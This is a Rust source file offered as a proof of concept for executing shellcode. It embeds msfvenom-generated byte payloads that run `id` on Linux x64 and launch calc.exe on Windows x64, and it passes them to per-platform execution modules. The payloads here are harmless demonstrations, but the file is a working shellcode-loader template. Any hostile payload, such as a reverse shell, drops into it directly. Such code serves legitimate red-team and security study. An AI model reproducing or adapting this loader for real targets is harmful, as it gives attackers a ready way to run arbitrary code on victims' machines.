#[cfg(target_os = "linux")]
mod linux_exec;

#[cfg(target_os = "windows")]
mod windows_exec;

///POC to execute shellcode within rust
fn main(){
    /*
        Shellcode to run `id` for linux/x64
        msfvenom -p linux/x64/exec CMD=id -f c -b "\x00" 
    */
    #[cfg(target_os = "linux")]
    static SC: [u8; 87] = *b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x42\xd2\x83\x85\x2c\x0e\x5d\xad\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x28\xe9\xdb\x1c\x64\xb5\x72\xcf\x2b\xbc\xac\xf6\x44\x0e\x0e\xe5\xcb\x35\xeb\xa8\x4f\x0e\x5d\xe5\xcb\x34\xd1\x6d\x2f\x0e\x5d\xad\x2b\xb6\x83\xd3\x7b\x46\xd4\x4b\x4d\xd7\x83\x85\x2c\x0e\x5d\xad";
    
    //Run Linux Shellcode
    #[cfg(target_os = "linux")]
    linux_exec::run( SC.to_vec() );



    /* 
        Shellcode to pop calc.exe for windows/x64
        msfvenom -p windows/x64/exec CMD=calc.exe -f c -b "\x00"
    */ 
    #[cfg(target_os = "windows")]
    static SC: [u8; 319] = *b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xb9\x2f\xec\x7b\x44\x28\xde\xf2\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x45\x67\x6f\x9f\xb4\xc0\x1e\xf2\xb9\x2f\xad\x2a\x05\x78\x8c\xa3\xef\x67\xdd\xa9\x21\x60\x55\xa0\xd9\x67\x67\x29\x5c\x60\x55\xa0\x99\x67\x67\x09\x14\x60\xd1\x45\xf3\x65\xa1\x4a\x8d\x60\xef\x32\x15\x13\x8d\x07\x46\x04\xfe\xb3\x78\xe6\xe1\x3a\x45\xe9\x3c\x1f\xeb\x6e\xbd\x33\xcf\x7a\xfe\x79\xfb\x13\xa4\x7a\x94\xa3\x5e\x7a\xb9\x2f\xec\x33\xc1\xe8\xaa\x95\xf1\x2e\x3c\x2b\xcf\x60\xc6\xb6\x32\x6f\xcc\x32\x45\xf8\x3d\xa4\xf1\xd0\x25\x3a\xcf\x1c\x56\xba\xb8\xf9\xa1\x4a\x8d\x60\xef\x32\x15\x6e\x2d\xb2\x49\x69\xdf\x33\x81\xcf\x99\x8a\x08\x2b\x92\xd6\xb1\x6a\xd5\xaa\x31\xf0\x86\xb6\x32\x6f\xc8\x32\x45\xf8\xb8\xb3\x32\x23\xa4\x3f\xcf\x68\xc2\xbb\xb8\xff\xad\xf0\x40\xa0\x96\xf3\x69\x6e\xb4\x3a\x1c\x76\x87\xa8\xf8\x77\xad\x22\x05\x72\x96\x71\x55\x0f\xad\x29\xbb\xc8\x86\xb3\xe0\x75\xa4\xf0\x56\xc1\x89\x0d\x46\xd0\xb1\x33\xfe\x29\xde\xf2\xb9\x2f\xec\x7b\x44\x60\x53\x7f\xb8\x2e\xec\x7b\x05\x92\xef\x79\xd6\xa8\x13\xae\xff\xd8\x6b\x50\xef\x6e\x56\xdd\xd1\x95\x43\x0d\x6c\x67\x6f\xbf\x6c\x14\xd8\x8e\xb3\xaf\x17\x9b\x31\x2d\x65\xb5\xaa\x5d\x83\x11\x44\x71\x9f\x7b\x63\xd0\x39\x18\x25\x44\xbd\xdc\xdc\x57\x89\x7b\x44\x28\xde\xf2";

    //Run Windows Shellcode 
    #[cfg(target_os = "windows")]
    windows_exec::run( SC.to_vec() );
}